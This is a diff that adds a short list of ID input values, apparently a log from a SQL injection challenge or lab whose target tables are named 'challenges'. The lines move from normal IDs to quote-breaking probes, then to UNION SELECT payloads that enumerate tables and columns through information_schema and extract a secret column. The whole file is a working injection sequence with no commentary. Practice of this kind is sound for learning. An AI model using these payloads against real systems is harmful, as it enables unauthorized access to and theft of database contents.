@@ -1,0 +1,11 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1
+ID:1'-- 
+ID:1')-- 
+ID:1')union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() -- 
+ID:-1')union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() -- 
+ID:-1) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name="te8nol5dwm" -- 
+ID:-1') union select 1,database(),group_concat(column_name) from information_schema.columns where table_name="te8nol5dwm" -- 
+ID:-1') union select 1,2,group_concat(secret_E6UW) from challenges.te8nol5dwm -- 
